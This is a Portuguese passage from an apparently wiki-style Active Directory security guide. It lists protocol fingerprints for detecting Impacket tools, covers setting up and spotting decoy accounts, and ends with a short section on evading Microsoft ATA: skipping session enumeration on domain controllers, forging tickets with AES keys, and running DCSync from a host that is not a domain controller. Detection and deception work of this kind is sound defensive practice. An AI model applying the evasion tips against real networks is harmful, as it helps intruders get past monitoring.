### Identificação de atividade do Impacket por fingerprinting em nível de protocolo

Para detectar técnicas comuns de AD, **não confie apenas em artefatos controlados pelo operador**, como binários renomeados, nomes de serviços, arquivos batch temporários ou caminhos de saída. Estabeleça uma baseline de como clientes legítimos do Windows geram tráfego [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI; em seguida, procure **peculiaridades de implementação** que persistam mesmo depois que o operador editar `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Possíveis indicadores autônomos de alta confiança** (após validar em relação à sua própria baseline):
  - DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
  - Preenchimento de padding de autenticação DCE/RPC com `0xff`
  - Binds Kerberos LDAP que colocam um `AP-REQ` Kerberos bruto diretamente em `mechToken` do SPNEGO
  - Solicitações de negociação SMB2/3 com valores de `ClientGuid` que parecem ASCII
  - `IWbemLevel1Login::NTLMLogin` do WMI usando o namespace não padrão `//./root/cimv2`
  - Valores de nonce Kerberos hardcoded
- **Melhores como recursos de correlação/pontuação**:
  - Listas de etype Kerberos esparsas ou duplicadas, `PA-DATA` incomum/ausente ou ordenação de etype em TGS-REQ diferente da nativa do Windows
  - Mensagens NTLM Tipo 1 sem informações de versão ou mensagens Tipo 3 com nomes de host nulos
  - NTLMSSP bruto transportado em DCE/RPC em vez de SPNEGO, ausência de trailers de verificação DCE/RPC ou incompatibilidades entre OIDs de SPNEGO/Kerberos
  - Várias dessas características do mesmo host/usuário/sessão/período são muito mais confiáveis do que qualquer campo fraco isolado
- **Use como contexto adicional, não como alertas autônomos**:
  - Nomes de arquivo padrão, caminhos de saída, nomes aleatórios de serviços, nomes de arquivos batch temporários, nomes padrão de contas de computador e strings específicas de ferramentas para HTTP/WebDAV/RDP/MSSQL
  - São fáceis de alterar pelos operadores e funcionam melhor para explicar por que um agrupamento entre protocolos é suspeito
- **Observações operacionais**:
  - Alguns desses sinais exigem tráfego descriptografado, [análise de PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou visibilidade do lado do serviço
  - Valide em relação a clientes Samba/Linux, dispositivos e software legado antes de transformar os sinais em alertas
  - Promova as detecções de enriquecimento -> investigação -> alerta à medida que a confiança na baseline aumentar

### **Implementação de técnicas de deception**

- A implementação de deception envolve armar iscas, como usuários ou computadores chamariz, com características como senhas que não expiram ou a flag Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos com privilégios elevados.<sup>[[2]](#references)</sup>
- Um exemplo prático é usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Saiba mais sobre a implementação de técnicas de deception em [Deploy-Deception no GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificação de deception**

- **Para objetos de usuário**: indicadores suspeitos incluem ObjectSID atípico, logins pouco frequentes, datas de criação e baixas contagens de senhas incorretas.
- **Indicadores gerais**: comparar os atributos de possíveis objetos chamariz com os de objetos legítimos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar esse tipo de deception.

### **Como contornar sistemas de detecção**

- **Contorno da detecção do Microsoft ATA**:
  - **Enumeração de usuários**: evitar a enumeração de sessões em Domain Controllers para impedir a detecção pelo ATA.
  - **Impersonação de tickets**: usar chaves **aes** para criar tickets ajuda a evitar a detecção, pois não há downgrade para NTLM.
  - **Ataques DCSync**: recomenda-se executar a partir de um host que não seja Domain Controller para evitar a detecção pelo ATA, pois a execução direta em um Domain Controller dispara alertas.

## References

- [1] [Um guia para atacar relações de confiança entre domínios](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjando relações de confiança para deception no Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Coleção LDAP BOF – Kit de ferramentas LDAP em memória para exploração do Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Transformando hashes NTLM em uma wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (laboratório AD do NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analisando o Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: assumindo o controle de contas do Active Directory via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Como gerenciar as alterações nas conexões de canal seguro do Netlogon associadas à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Uma jornada pelas interfaces Null Session e MS-RPC esquecidas](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [O filtro SID é uma fronteira de segurança entre domínios? (Parte 4) - Pesquisa sobre como contornar a filtragem de SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [O filtro SID é uma fronteira de segurança entre domínios? (Parte 5) - Ataque de confiança Golden GMSA - do domínio filho ao pai](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [O filtro SID é uma fronteira de segurança entre domínios? (Parte 6) - Ataque de confiança por alteração de esquema - do domínio filho ao pai](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA com ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [De administradores de domínio filho a administradores corporativos em 5 minutos, abusando do AD CS: continuação](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Um ACE na manga: projetando backdoors de DACL do Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Código-fonte do módulo pre2k do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atributo msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
